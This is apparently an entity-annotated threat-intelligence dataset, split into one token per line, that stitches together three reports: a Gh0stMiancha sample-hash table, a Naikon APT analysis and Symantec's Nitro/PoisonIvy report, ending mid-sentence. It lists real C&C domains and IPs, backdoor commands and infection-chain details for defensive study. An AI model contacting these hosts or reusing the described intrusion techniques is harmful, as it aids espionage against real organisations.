04e7361323b431f7c9f86388f316bbea B_hash
e3c095c7ace563b41b3f4310f3de69e47c86fd03
73ef70f1e80e32341eebcb3b1084cf896f6b1aa701b7a6c7abcb9293500d84ae
Size
(
bytes
)
10299
Compile
Time
2013-11-26
09:34:10
UTC
In-the-wild
Filenames
install.ocx
PDB
String
h:\2013.11.25\server(壳)\Release\server.pdb
Obfuscated
TrojanLoader
:
W64
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
SHA256
01f7b465242237bd3d31d39767aa68e0 B_hash
db4ec59bf7f34a21f9dc7f2ded68c616f7c0fe47
ed39c1d86ff8cfe18ef58e850d205a678d255150324b00661b91448173c94900
Size
(
bytes
)
Compile
Time
12347
N/A
In-the-wild
Filenames
dll64.tmp
TrojanLoader
:
W64
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
008fbd0fde06edb31fc7eecdae1a3030 B_hash
b9ae0a079cd1dae96425ced4bb96ba0f71c87a7a

SHA256
cc8d38d3cc214ff3ad10d6859a88e018b1f7e0ed6df7d04a6f4368bda851ba14
Size
(
bytes
)
12347
Compile
Time
2013-11-26
11:47:39
UTC
In-the-wild
Filenames
install.ocx
PDB
String
C
:
\Users\why\Desktop\server(壳)\x64\Release\server.pdb

Obfuscated
Trojan
:
W32
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
SHA256
569071c45f47b7fb7a75f30bc07d5739 B_hash
540bb9d2dee8f4e10e5ae0a5cc900b346a57a198
8a00b2aefdcd0bb22013bbe9c7941fa16af8246e545e1522622006b9c88ca716
Size
(
bytes
)
Compile
Time
169019
N/A
In-the-wild
Filenames
instructions.pdf

Trojan
:
W32
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
SHA256
916b1a07efb145c450b4c13540be6c3e B_hash
7984639beb4e9870301d3b44a68b4346f9a6b826
f26c2e9bee680f8e4d7afd73e2984a6697263334d2f0049a40e050d75293035e
Size
(
bytes
)
169019
Compile
Time
2013-12-06
08:08:28
UTC
In-the-wild
Filenames
N/A
PDB
String
h:\2013.11.25\白加黑\server(update.dll)(instructions.pdf)\Release\server.pdb

Obfuscated
Trojan
:
W64
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
SHA256
55474f8e26f2b6fc3b5d78ce9a77b0b0 B_hash
3f714c33992e906e69df2d5d4971beaed336d9f4
27e5670f68ff68acc80716c6870f4e5d06c471791f087d5b9b7613f8dc700037
Size
(
bytes
)
Compile
Time
233019
N/A
In-the-wild
Filenames
instructions64.pdf

Trojan
:
W64
/
Gh0stMiancha B_malware.backdoor
MD5
SHA1
SHA256
1d2c77f0f8a715de09ce6fae5fc800d4 B_hash
30784735763b060a39f76c29439a6aebbf6a4b9b
2fdf454f6b1c82d757d054bea5f0438f5da1ecd9e5059610d3d4b74e75a7c8b0
Size
(
bytes
)
233019
Compile
Time
2013-12-06
08:10:34
UTC
In-the-wild
Filenames
N/A
PDB
String
C
:
\Users\why\Desktop\server(update.dll)(instructions.pdf)x64\x64\Release\server.pdb

Context
Information
Security
-
Threat
Intelligence
-
threat@contextis.co.uk
London
(
HQ
)
Cheltenham
Düsseldorf
Melbourne
4th
Floor
Corinth
House
1.OG
4th
Floor
30
Marsh
Wall
117
Bath
Road
Adersstr
.

28
155
Queen
Street
London
E14
9TP
Cheltenham
GL53
7LS
40215
Düsseldorf
Melbourne
VIC
3000
United
Kingdom
United
Kingdom
Germany
Australia
The
Naikon
APT
Tracking
Down
Geo-Political
Intelligence
Across
APAC
,
One
Nation
at
a
Time
By
Kurt
Baumgartner
,
Maxim
Golovkin
on
May
14
,
2015
.

3:00
am

Our
recent
report
,
'The
Chronicles
of
the
Hellsing
APT
:
the
Empire
Strikes
Back
'
began
with
an
introduction
to
the
Naikon
APT
,
describing
it
as
'One
of
the
most
active
APTs
in
Asia
,
especially
around
the
South
China
Sea
'
.

Naikon
was
mentioned
because
of
its
role
in
what
turned
out
to
be
a
unique
and
surprising
story
about
payback
.

It
was
a
Naikon
attack
on
a
Hellsing-related
organization
that
first
introduced
us
to
the
Hellsing
APT
.

Considering
the
volume
of
Naikon
activity
observed
and
its
relentless
,
repeated
attack
attempts
,
such
a
confrontation
was
worth
looking
into
,
so
we
did
.

The
#
NaikonAPT
group
was
spear-phished
by
an
actor
we
now
call
'
Hellsing
'
Tweet

The
Naikon
APT
aligns
with
the
actor
our
colleagues
at
FireEye
recently
revealed
to
be
APT30
,
but
we
haven't
discovered
any
exact
matches
.

It
is
hardly
surprising
that
there
is
an
element
of
overlap
,
considering
both
actors
have
for
years
mined
victims
in
the
South
China
Sea
area
,
apparently
in
search
of
geo-political
intelligence
.

The
#
NaikonAPT
Tweet
group
has
for
5
years
mined
victims
,
apparently
in
search
of
geo-political
intelligence

This
Naikon
report
will
be
complemented
by
a
follow-on
report
that
will
examine
the
Naikon
TTP
and
the
incredible
volume
of
attack
activity
around
the
South
China
Sea
that
has
been
going
on
since
at
least
2010
.

Noteworthy
operational
and
logistical
characteristics
of
this
APT
include
:

At
least
five
years
of
high
volume
,
high
profile
,
geo-political
attack
activity
Geographical
focus
-
per-country
,
individual
operator
assignment
and
proxy
presence
Dynamic
,
well
organized
infrastructure
Reliance
on
an
externally
developed
,
consistent
set
of
tools
comprising
a
full-featured
backdoor
,
a
builder
,
and
an
exploit
builder
High
success
rate
in
infiltrating
national
organisations
in
ASEAN
countries
Highly
Focused
and
Effective
Highly
Focused
and
Effective
Around
the
South
China
Sea
Around
the
South
China
Sea
In
the
spring
of
2014
,
we
noticed
an
increase
in
the
volume
of
attack
activity
by
the
Naikon
APT
.

The
attackers
appeared
to
be
Chinese-speaking
and
targeted
mainly
top-level
government
agencies
and
civil
and
military
organizations
in
countries
such
as
the
Philippines
,
Malaysia
,
Cambodia
,
Indonesia
,
Vietnam
,
Myanmar
,
Singapore
,
Nepal
,
Thailand
,
Laos
and
China
.

Decoy
An
attack
typically
starts
with
an
email
carrying
an
attachment
that
contains
information
of
interest
to
the
potential
victim
.

The
document
may
be
based
on
information
from
open
sources
or
on
proprietary
information
stolen
from
other
compromised
systems
.

This
bait
'
document
'
,
or
email
attachment
,
appears
to
be
a
standard
Word
document
,
but
is
in
fact
an
CVE-2012-0158
exploit
,
an
executable
with
a
double
extension
,
or
an
executable
with
an
RTLO
filename
,
so
it
can
execute
code
without
the
user
's
knowledge
or
consent
.

When
the
executable
is
launched
,
spyware
is
installed
on
the
victim
computer
at
the
same
time
as
a
decoy
document
is
displayed
to
the
user
;
fooling
them
into
thinking
they
have
simply
opened
a
document
.

Configuration
The
Naikon
tool
of
choice
generates
a
special
,
small
,
encrypted
file
which
is
8,000
bytes
in
size
,
containing
code
to
be
injected
into
the
browser
along
with
configuration
data
.

With
the
help
of
a
start-up
module
,
this
whole
file
is
injected
into
the
browser
memory
and
decrypts
the
configuration
block
containing
the
following
:

C
&
C
server
Ports
and
path
to
the
server
User-agent
string
Filenames
and
paths
to
its
components
Hash
sums
of
the
user
API
functions

The
same
code
then
downloads
its
main
body
from
the
C
&
C
server
using
the
SSL
protocol
,
loads
it
independently
from
the
operating
system
functions
and
,
without
saving
it
to
the
hard
drive
,
hands
over
control
to
the
XS02
function
.

All
functionality
is
handled
in
memory
.

Payload
The
main
module
is
a
remote
administration
utility
.

Using
SSL
,
the
module
establishes
a
reverse
connection
to
the
C
&
C
server
as
follows
:
it
sets
up
an
outgoing
connection
to
the
C
&
C
server
and
checks
if
there
is
a
command
that
it
should
execute
.

If
there
is
,
it
executes
the
command
and
returns
the
result
to
the
C
&
C
.

There
are
48
commands
in
the
module
's
repertoire
,
which
a
remote
operator
can
use
to
effectively
control
the
victim
computer
.

This
includes
taking
a
complete
inventory
,
downloading
and
uploading
data
,
installing
add-on
modules
,
or
working
with
the
command
line
.

Tweet
The
main
module
supports
48
commands
,
which
the
attackers
can
use
to
control
the
victim
machine
#
NaikonAPT

Here
is
the
complete
list
of
commands
:

0123456789
10
11
CMD_MAIN_INFO
CMD_PROCESS_REFRESH
CMD_PROCESS_NAME
CMD_PROCESS_KILL
CMD_PROCESS_MODULE
CMD_DRIVE_REFRESH
CMD_DIRECTORY
CMD_DIRECTORY_CREATE
CMD_DIRECTORY_CREATE_HIDDEN
CMD_DIRECTORY_DELETE
CMD_DIRECTORY_RENAME
CMD_DIRECOTRY_DOWNLOAD
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
CMD_FILE_REFRESH
CMD_FILE_DELETE
CMD_FILE_RENAME
CMD_FILE_EXECUTE_NORMAL
CMD_FILE_EXECUTE_HIDDEN
CMD_FILE_EXECUTE_NORMAL_CMD
CMD_FILE_EXECUTE_HIDDEN_CMD
CMD_FILE_UPLOAD
CMD_FILE_DOWNLOAD
CMD_WINDOWS_INFO
CMD_WINDOWS_MESSAGE
CMD_SHELL_OPEN
CMD_SHELL_CLOSE
CMD_SHELL_WRITE
CMD_SERVICE_REFRESH
CMD_SERVICE_CONTROL
CMD_PROGRAM_INFO
CMD_UNINSTALL_PROGRAM
CMD_REGESTRY_INFO
CMD_ADD_AUTO_START
CMD_MY_PLUGIN
CMD_3RD_PLUGIN
CMD_REG_CREATEKEY
CMD_REG_DELETEKEY
CMD_REG_SETVALUE
CMD_REG_DELETEVALUE
CMD_SELF_KILL
CMD_SELF_RESTART
CMD_SELF_CONFIG
CMD_SELF_UPDATE
CMD_SERVER_INFO
CMD_INSTALL_SERVICE
CMD_FILE_DOWNLOAD2
CMD_RESET
46
50
CMD_CONNECTION_TABLE
CMD_HEART_BEAT

Several
modifications
of
the
main
module
exist
.
There
are
no
fundamental
differences
between
modifications
;
it
's
just
that
extra
features
get
added
to
the
latest
versions
,
such
as
compression
and
encryption
of
transmitted
data
,
or
the
piecemeal
download
of
large
files
.

d085ba82824c1e61e93e113a705b8e9a B_hash
118272
b4a8dc9eb26e727eafb6c8477963829c B_hash
140800
172fd9cce78de38d8cbcad605e3d6675 B_hash
118784
d74a7e7a4de0da503472f1f051b68745 B_hash
190464
93e84075bef7a11832d9c5aa70135dc6 B_hash
154624
Aug
23
18:46:57
2012
May
20
11:56:38
2013
Jun
13
12:14:40
2013
Aug
19
05:30:12
2013
Jan
07
04:39:43
2014

CC-Proxy-Op
C
&
C
server
operations
are
characterized
by
the
following
:
Low
maintenance
requirements
Organized
geo-specific
task
assignments
Different
approaches
to
communication
The
C
&
C
servers
must
have
required
only
a
few
operators
to
manage
the
entire
network
.

Each
operator
appears
to
have
focused
on
their
own
particular
set
of
targets
,
because
a
correlation
exists
between
C
&
C
and
the
location
of
targets/victims
.

Tweet
There
is
a
geo-specific
correlation
between
the
location
of
#
NaikonAPT
C
&
Cs
and
that
of
targets/victims

Communication
with
victim
systems
changed
depending
on
the
target
involved
.
In
some
cases
,
a
direct
connection
was
established
between
the
victim
computer
and
the
C
&
C
.

In
other
cases
,
the
connection
was
established
via
dedicated
proxy
servers
installed
on
dedicated
servers
rented
in
third
countries
.

In
all
likelihood
,
this
additional
setup
was
a
reaction
to
the
network
administrators
in
some
targets
limiting
or
monitoring
outbound
network
connections
from
their
organizations
.

Here
is
a
partial
list
of
C
&
C
servers
and
victim
locations
,
demonstrating
the
geo-specific
correlation
:
ID
Jakarta
ID
Jakarta
ID
Jakarta
ID
ID
Bandung
ID
Bandung
ID
Jakarta
JP
Tokyo
KH
KH
Phnom
Penh
MM
MM
MM
MM
Yangon
MM
linda.googlenow.in B_url.cncsvr
admin0805.gnway.net B_url.cncsvr
free.googlenow.in B_url.cncsvr
frankhere.oicp.net B_url.cncsvr
frankhere.oicp.net B_url.cncsvr
telcom.dhtu.info B_url.cncsvr
laotel08.vicp.net B_url.cncsvr
greensky27.vicp.net B_url.cncsvr
googlemm.vicp.net B_url.cncsvr
googlemm.vicp.net B_url.cncsvr
peacesyou.imwork.net B_url.cncsvr
sayakyaw.xicp.net B_url.cncsvr
ubaoyouxiang.gicp.net B_url.cncsvr
htkg009.gicp.net B_url.cncsvr
kyawthumyin.xicp.net B_url.cncsvr
MM
MM
MY
MY
MY
MY
MY
Putrajaya
MY
Putrajaya
PH
Caloocan
PH
Caloocan
PH
PH
PH
PH
PH
PH
PH
SG
Singapore
SG
Singapore
VN
Hanoi
VN
Hanoi
VN
Hanoi
VN
Dong
Ket
VN
Hanoi
VN
Hanoi
VN
Hanoi
VN
Hanoi
VN
Binh
Duong
VN
Binh
Duong
VN
Hanoi
VN
Hanoi
VN
Hanoi
VN
Hanoi
VN
Hanoi
myanmartech.vicp.net B_url.cncsvr
test-user123.vicp.cc B_url.cncsvr
us.googlereader.pw B_url.cncsvr
net.googlereader.pw B_url.cncsvr
lovethai.vicp.net B_url.cncsvr
yahoo.goodns.in B_url.cncsvr
xl.findmy.pw B_url.cncsvr
xl.kevins.pw B_url.cncsvr
oraydns.googlesec.pw B_url.cncsvr
gov.yahoomail.pw B_url.cncsvr
pp.googledata.pw B_url.cncsvr
xl.findmy.pw B_url.cncsvr
mlfjcjssl.gicp.net B_url.cncsvr
o.wm.ggpw.pw B_url.cncsvr
oooppp.findmy.pw B_url.cncsvr
cipta.kevins.pw B_url.cncsvr
phi.yahoomail.pw B_url.cncsvr
xl.findmy.pw B_url.cncsvr
dd.googleoffice.in B_url.cncsvr
moziliafirefox.wicp.net B_url.cncsvr
bkav.imshop.in B_url.cncsvr
baomoi.coyo.eu B_url.cncsvr
macstore.vicp.cc B_url.cncsvr
downloadwindows.imwork.net B_url.cncsvr
vietkey.xicp.net B_url.cncsvr
baomoi.vicp.cc B_url.cncsvr
downloadwindow.imwork.net B_url.cncsvr
www.ttxvn.net B_url.cncsvr
vietlex.gnway.net B_url.cncsvr
www.ttxvn.net B_url.cncsvr
us.googlereader.pw B_url.cncsvr
yahoo.goodns.in B_url.cncsvr
lovethai.vicp.net B_url.cncsvr
vietlex.gnway.net B_url.cncsvr

XSControl
-
the
Naikon
APT
's
XSControl
-
the
Naikon
APT
's
'victim
management
software
'
'victim
management
software
'
In
the
Naikon
scheme
,
a
C
&
C
server
can
be
specialized
XSControl
software
running
on
the
host
machine
.

It
can
be
used
to
manage
an
entire
network
of
infected
clients
.

In
some
cases
,
a
proxy
is
used
to
tunnel
victim
traffic
to
the
XSControl
server
.

A
Naikon
proxy
server
is
a
dedicated
server
that
accepts
incoming
connections
from
victim
computers
and
redirects
them
to
the
operator
's
C
&
C
.

An
individual
Naikon
proxy
server
can
be
set
up
in
any
target
country
with
traffic
tunnelling
from
victim
systems
to
the
related
C
&
C
servers
.

XSControl
is
written
in
.NET
with
the
use
of
DevExpress
:

Its
main
capabilities
are
:
Accept
initial
connections
from
clients
Provide
clients
with
the
main
remote
administration
module
Enable
them
to
remotely
administer
infected
computers
with
the
help
of
a
GUI
Keep
logs
of
client
activity
Keep
logs
of
operator
activity
Upload
logs
and
files
to
an
FTP
server
The
operator
's
activity
logs
contain
the
following
:
An
XML
database
of
downloaded
files
,
specifying
the
time
of
operation
,
the
remote
path
and
the
local
path
A
database
of
file
names
,
the
victim
computer
registry
keys
for
the
folders
and
requested
sections
A
history
of
executed
commands

Country
X
,
Operator
X

Now
let
's
do
an
overview
of
one
Naikon
campaign
,
focusing
on
country
'X
'
.

Analysis
revealed
that
the
cyber-espionage
campaign
against
country
X
had
been
going
on
for
many
years
.

Computers
infected
with
the
remote
control
modules
provided
attackers
with
access
to
employees
'
corporate
email
and
internal
resources
,
and
access
to
personal
and
corporate
email
content
hosted
on
external
services
.

Below
is
a
partial
list
of
organizations
affected
by
Naikon
's
'operator
X
's
'
espionage
campaign
in
country
X
.

Office
of
the
President
Military
Forces
Office
of
the
Cabinet
Secretary
National
Security
Council
Office
of
the
Solicitor
General
Intelligence
Services
Civil
Aviation
Authority
Department
of
Justice
Federal
Police
Executive/Presidential
Administration
and
Management
Staff
A
few
of
these
organizations
were
key
targets
and
under
continuous
,
real-time
monitoring
.

It
was
during
operator
X
's
network
monitoring
that
the
attackers
placed
Naikon
proxies
within
the
countries
'
borders
,
to
cloak
and
support
real-time
outbound
connections
and
data
exfiltration
from
high-profile
victim
organizations
.

In
order
to
obtain
employees
'
credentials
,
operator
X
sometimes
used
keyloggers
.

If
necessary
,
operator
X
delivered
them
via
the
remote
control
client
.

In
addition
to
stealing
keystrokes
,
this
attacker
also
intercepted
network
traffic
.

Lateral
movements
included
copying
over
and
remotely
setting
up
winpcap
across
desktop
systems
within
sensitive
office
networks
,
then
remotely
setting
up
AT
jobs
to
run
these
network
sniffers
.

Some
APTs
like
Naikon
distribute
tools
such
as
these
across
multiple
systems
in
order
to
regain
control
if
it
is
lost
accidentally
and
to
maintain
persistence
.

Tweet
The
#
NaikonAPT
group
took
advantage
of
cultural
idiosyncrasies
in
its
target
countries

Operator
X
also
took
advantage
of
cultural
idiosyncrasies
in
its
target
countries
,
for
example
,
the
regular
and
widely
accepted
use
of
personal
Gmail
accounts
for
work
.

So
it
was
not
difficult
for
the
Naikon
APT
to
register
similar-looking
email
addresses
and
to
spear-phish
targets
with
attachments
,
links
to
sites
serving
malware
,
and
links
to
google
drive
.

The
empire
strikes
back
The
empire
strikes
back

Every
once
in
a
while
the
Naikon
group
clashes
with
other
APT
groups
that
are
also
active
in
the
region
.

In
particular
,
we
noticed
that
the
Naikon
group
was
spear-phished
by
an
actor
we
now
call
'Hellsing
'
.

More
details
about
the
cloak
and
dagger
games
between
Naikon
and
Hellsing
can
be
found
in
our
blogpost
:
'The
Chronicles
of
the
Hellsing
APT
:
The
Empire
Strikes
Back
'
.

Related
Articles
Security
Response

Contents
Introduction
.......................................................
1
Targets................................................................
1
Attack
methodology
..........................................
2
Geographic
Spread
...........................................
3
Attribution
..........................................................
4
Technical
details
................................................
4
Delivery
........................................................
4
Threat
details
...............................................
5
Command
and
Control
(
C
&
C
)
......................
6
Related
Attacks
..................................................
6
Summary
............................................................
6
Appendix
............................................................
7

The
Nitro
Attacks

Stealing
Secrets
from
the
Chemical
Industry

Eric
Chien
and
Gavin
O'Gorman

Introduction
This
document
discusses
a
recent
targeted
attack
campaign
directed
primarily
at
private
companies
involved
in
the
research
,
development
,
and
manufacture
of
chemicals
and
advanced
materials
.

The
goal
of
the
attackers
appears
to
be
to
collect
intellectual
property
such
as
design
documents
,
formulas
,
and
manufacturing
processes
.

In
addition
,
the
same
attackers
appear
to
have
a
lengthy
operation
history
including
attacks
on
other
industries
and
organizations
.

Attacks
on
the
chemical
industry
are
merely
their
latest
attack
wave
.

As
part
of
our
investigations
,
we
were
also
able
to
identify
and
contact
one
of
the
attackers
to
try
and
gain
insights
into
the
motivations
behind
these
attacks
.

As
the
pattern
of
chemical
industry
targets
emerged
,
we
internally
code-named
the
attack
campaign
Nitro
.

The
attack
wave
started
in
late
July
2011
and
continued
into
mid-September
2011
.

However
,
artifacts
of
the
attack
wave
such
as
Command
and
Control
(
C
&
C
)
servers
are
also
used
as
early
as
April
2011
and
against
targets
outside
the
chemical
industry
.

The
purpose
of
the
attacks
appears
to
be
industrial
espionage
,
collecting
intellectual
property
for
competitive
advantage
.

Targets

The
attackers
have
changed
their
targets
over
time
.

From
late
April
to
early
May
,
the
attackers
focused
on
human
rights
related
NGOs
.

They
then
moved
on
to
the
motor
industry
in
late
May
.

From
June
until
mid-July
no
activity
was
detected
.

At
this
point
,
the
current
attack
campaign
against
the
chemical
industry
began
.

This
particular
attack
has
lasted
much
longer
than
previous
attacks
,
spanning
two
and
a
half
months
.

A
total
of
29
companies
in
the
chemical
sector
were
confirmed
to
be
targeted
in
this
attack
wave
and
another
19
in
various
other
sectors
,
primarily
the
defense
sector
,
were
seen
to
be
affected
as
well
.

These
48
companies
are
the
minimum
number
of
companies
targeted
and
likely
other
companies
were
also
targeted
.

In
a
recent
two
week
period
,
101
unique
IP
addresses
contacted
a
command
and
control
server
with
traffic
consistent
with
an
infected
machine
.

These
IPs
represented
52
different
unique
Internet
Service
Providers
or
organizations
in
20
countries
.

Companies
affected
include
:

Multiple
Fortune
100
companies
involved
in
research
and
development
of
chemical
compounds
and
advanced
materials
.

Companies
that
develop
advanced
materials
primarily
for
military
vehicles
.

Companies
involved
in
developing
manufacturing
infrastructure
for
the
chemical
and
advanced
materials
industry
.

Attack
methodology

The
attackers
first
researched
desired
targets
and
then
sent
an
email
specifically
to
the
target
.

Each
organization
typically
only
saw
a
handful
of
employees
at
the
receiving
end
of
these
emails
.

However
,
in
one
organization
almost
500
recipients
received
a
mail
,
while
in
two
other
organizations
,
more
than
100
were
selected
.

While
the
attackers
used
different
pretexts
when
sending
these
malicious
emails
,
two
methodologies
stood
out
.

First
,
when
a
specific
recipient
was
targeted
,
the
mails
often
purported
to
be
meeting
invitations
from
established
business
partners
.

Secondly
,
when
the
emails
were
being
sent
to
a
broad
set
of
recipients
,
the
mails
purported
to
be
a
necessary
security
update
.

The
emails
then
contained
an
attachment
that
was
either
an
executable
that
appeared
to
be
a
text
file
based
on
the
file
name
and
icon
,
or
a
password-protected
archive
containing
an
executable
file
with
the
password
provided
in
the
email
.

In
both
cases
,
the
executable
file
was
a
self-extracting
executable
containing
PoisonIvy
,
a
common
backdoor
Trojan
developed
by
a
Chinese
speaker
.

When
the
recipient
attempted
to
open
the
attachment
,
they
would
inadvertently
execute
the
file
,
causing
Poi-sonIvy
to
be
installed
.

Once
PoisonIvy
was
installed
,
it
contacted
a
C
&
C
server
on
TCP
port
80
using
an
encrypted
communication
protocol
.

Using
the
C
&
C
server
,
the
attackers
then
instructed
the
compromised
computer
to
provide
the
infected
computer
's
IP
address
,
the
names
of
all
other
computers
in
the
workgroup
or
domain
,
and
dumps
of
Windows
cached
password
hashes
.

By
using
access
to
additional
computers
through
the
currently
logged
on
user
or
cracked
passwords
through
dumped
hashes
,
the
attackers
then
began
traversing
the
network
infecting
additional
computers
.

Typically
,
their
primary
goal
is
to
obtain
domain
administrator
credentials
and/or
gain
access
to
a
system
storing
intellectual
property
.

Domain
administrator
credentials
make
it
easier
for
the
attacker
to
find
servers
hosting
the
desired
intellectual
property
and
gain
access
to
the
sensitive
materials
.

The
attackers
may
have
also
downloaded
and
installed
additional
tools
to
penetrate
the
network
further
.

While
the
behavior
of
the
attackers
differs
slightly
in
each
compromise
,
generally
once
the
attackers
have
identified
the
desired
intellectual
property
,
they
copy
the
content
to
archives
on
internal
systems
they
use
as
internal
staging
servers
.

This
content
is
then
uploaded
to
a
remote
site
outside
of
the
compromised
organization
completing
the
attack
.

Figure
1
Geographic
location
of
infected
computers

Geographic
Spread

Figure
1
shows
the
location
of
infected
computers
.
This
data
is
derived
from
the
IP
addresses
of
machines
connecting
back
to
the
command
and
control
server
.

The
majority
of
infected
machines
are
located
in
the
US
,
Bangladesh
and
the
UK
;
however
,
overall
there
is
wide
geographical
spread
of
infections
.

Figure
2
shows
the
country
of
origin
of
the
organizations
targeted
by
these
attacks
.

While
the
US
and
UK
again
figure
highly
here
,
overall
the
geographical
spread
is
different
.

This
means
that
the
infected
computers
are
rarely
located
within
the
organizations
'
headquarters
or
country
of
origin
.

Figure
2
Country
of
origin
of
targeted
organizations*
2
Denmark
5UK
Belgium
1
1
Netherlands
1
Italy
USA
12
1
Japan
1
Saudi
Arabia

*Additional
confirmed
infections
exist
;
however
,
they
did
not
contact
the
command
and
control
server
during
the
two-week
period
we
were
monitoring
it
.

There
are
two
possible
explanations
for
this
:

The
attackers
are
targeting
sites
,
or
individuals
in
certain
sites
,
which
they
know
have
access
to
certain
data
that
is
of
interest
to
the
attacker
.

The
attackers
are
targeting
sites
or
individuals
that
they
believe
have
less
security
measures
in
place
and
are
therefore
an
easier
access
point
into
the
victims
'
networks
.

We
can
conclude
that
the
attackers
are
not
targeting
organizations
in
a
particular
country
.

Attribution

The
attacks
were
traced
back
to
a
computer
system
that
was
a
virtual
private
server
(
VPS
)
located
in
the
United
States
.

However
,
the
system
was
owned
by
a
20-something
male
located
in
the
Hebei
region
in
China
.

We
internally
have
given
him
the
pseudonym
of
Covert
Grove
based
on
a
literal
translation
of
his
name
.

He
attended
a
vocational
school
for
a
short
period
of
time
specializing
in
network
security
and
has
limited
work
experience
,
most
recently
maintaining
multiple
network
domains
of
the
vocational
school
.

Covert
Grove
claimed
to
have
the
U.S.-based
VPS
for
the
sole
purpose
of
using
the
VPS
to
log
into
the
QQ
instant
message
system
,
a
popular
instant
messaging
system
in
China
.

By
owning
a
VPS
,
he
would
have
a
static
IP
address
.

He
claims
this
was
the
sole
purpose
of
the
VPS
.

And
by
having
a
static
IP
address
,
he
could
use
a
feature
provided
by
QQ
to
restrict
login
access
to
particular
IP
addresses
.

The
VPS
cost
was
RMB200
(
US
$
32
)
a
month
.

While
possible
,
with
an
expense
of
RMB200
a
month
for
such
protection
and
the
usage
of
a
US-based
VPS
,
the
scenario
seems
suspicious
.

We
were
unable
to
recover
any
evidence
the
VPS
was
used
by
any
other
authorized
or
unauthorized
users
.

Further
,
when
prompted
regarding
hacking
skills
,
Covert
Grove
immediately
provided
a
contact
that
would
perform
'hacking
for
hire
'
.

Whether
this
contact
is
merely
an
alias
or
a
different
individual
has
not
been
determined
.

We
are
unable
to
determine
if
Covert
Grove
is
the
sole
attacker
or
if
he
has
a
direct
or
only
indirect
role
.

Nor
are
we
able
to
definitively
determine
if
he
is
hacking
these
targets
on
behalf
of
another
party
or
multiple
parties
.

Technical
details
As
mentioned
above
,
the
threat
used
to
compromise
the
targeted
networks
is
Poison
Ivy
,
a
Remote
Access
Tool
(
RAT
)
.

This
application
is
freely
available
from
poisonivy-rat.com B_url.normal
.

It
comes
fully
loaded
with
a
number
of
plug-ins
to
give
an
attacker
complete
control
of
the
compromised
computer
.

Delivery

The
method
of
delivery
has
changed
over
time
as
the
attackers
have
changed
targets
.

Older
attacks
involved
a
self-extracting
archive
with
a
suggestive
name
,
for
example
:
'Human
right
report
of
north
Africa
under
the
war
.

scr
'
.

The
most
recent
attacks
focusing
on
the
chemical
industry
are
using
password-protected
7zip
files
which
,
when
extracted
,
contain
a
self-extracting
executable
.

The
password
to
extract
the
7zip
file
is
included
in
the
email
.

This
extra
stage
is
used
to
prevent
automated
systems
from
extracting
the
self-extracting
archive
.

Some
example
file
names
using
this
technique
include
:

AntiVirus_update_package.7z B_malware.drop
acquisition.7z B_malware.drop
offer.7z B_malware.drop
update_flashplayer10ax.7z B_malware.drop

Figure
3
Malicious
email

An
example
of
an
email
used
to
send
the
attachment
can
be
seen
in
figure
3
.

The
email
is
quite
generic
,
applicable
to
any
corporate
user
.

Some
of
the
subject
lines
will
vary
and
may
include
the
name
of
the
targeted
company
in
an
attempt
to
be
more
convincing
.

Threat
details
%
Temp%\happiness.txt
%
Temp%\xxxx.exe
When
the
self-extracting
archive
file
is
executed
,
it
will
drop
two
files
.

Examples
of
file
names
that
are
used
include
:

The
executable
file
,
xxxx.exe
in
this
case
,
is
then
executed
.

The
second
file
,
happiness.txt
,
contains
custom
code
in
binary
format
that
is
encrypted
and
used
by
xxxx.exe
.

The
xxxx.exe
file
copies
happiness.txt
to
C
:
\PROGRAM
FILES\common
files\
ODBC\ODUBC.DLL
and
to
C:\WINDOWS\system32\jql.sys
.

It
then
loads
the
contents
of
the
encrypted
file
and
injects
it
into
the
explorer.exe
and
iexplore.exe
processes
.

The
injected
code
copies
xxxx.exe
to
%
System%\winsys.exe
and
connects
to
the
Command
and
Control
(
C
&
C
)
server
on
TCP
port
80
.

The
communication
with
the
server
is
a
handshake
using
an
encryption
algorithm
(
Camellia
)
.

Once
the
Trojan
establishes
the
server
's
authenticity
,
it
expects
a
variable-size
block
of
binary
code
that
is
read
from
the
server
straight
into
the
virtual
space
for
iexplore.exe
and
then
executed
.

When
an
executable
is
compiled
,
the
compiler
will
store
some
metadata
in
the
compiled
executable
.

One
particular
piece
of
relevant
metadata
is
the
location
of
the
compiled
code
on
disk
.

The
path
in
this
instance
contained
Chinese
characters
and
was
:


This
translates
to
:
C
:
\Documents
and
Settings\Administrator\
[
Desktop
]
\
[
New
Folder
]
\
[
read
the
file
]
\Release\
[
read
the
file].pdb

Command
and
Control
(
C
&
C
)
When
executed
,
the
Poison
Ivy
threat
,
or
Backdoor.Odivy B_malware.backdoor
,
connects
to
a
command
and
control
(
C
&
C
)
server
over
TCP
port
80
.

A
number
of
different
C
&
C
domains
and
IP
addresses
were
identified
.

The
domains
and
IPs
are
listed
in
table
1
.

The
majority
of
samples
connect
to
a
domain
;
however
one
subset
of
samples
connected
directly
to
the
IP
address
204.74.215.58 B_url.cncsvr
,
which
belonged
to
the
Chinese
QQ
user
mentioned
previously
and
was
also
associated
with
antivirus-groups.com B_url.cncsvr
.

Related
Attacks
Table
1
C
&
C
domains
and
IPs
Domain
pr[REMOVED].noip.org B_url.cncsvr
IPs
173.252.207.71 B_ip.cncsvr
,
173.252.205.36 B_ip.cncsvr
,
173.252.205.37 B_ip.cncsvr
,
173.252.205.64 B_ip.cncsvr
antivirus-groups.com B_url.cncsvr
74.82.166.205 B_ip.cncsvr
,
204.74.215.58 B_ip.cncsvr
domain.rm6.org B_url.cncsvr
216.131.95.22 B_ip.cncsvr
,
222.255.28.27 B_ip.cncsvr
Several
other
hacker
groups
have
also
begun
targeting
some
of
the
same
chemical
companies
in
this
time
period
.

Attackers
are
sending
malicious
PDF
and
DOC
files
,
which
use
exploits
to
drop
variants
of
Backdoor.Sogu B_malware.backdoor
.

This
particular
threat
was
also
used
by
hackers
to
compromise
a
Korean
social
network
site
to
steal
records
of
35
million
users
.

173.252.205.36 B_ip.cncsvr
,
173.252.205.37 B_ip.cncsvr
,
173.252.205.64 B_ip.cncsvr
anti-virus.sytes.net B_url.cncsvr
Determining
if
the
two
groups
are
related
is
difficult
,
but
any
relationship
appears
unlikely
.

The
attackers
described
in
this
document
use
a
very
basic
delivery
platform
;
compressed
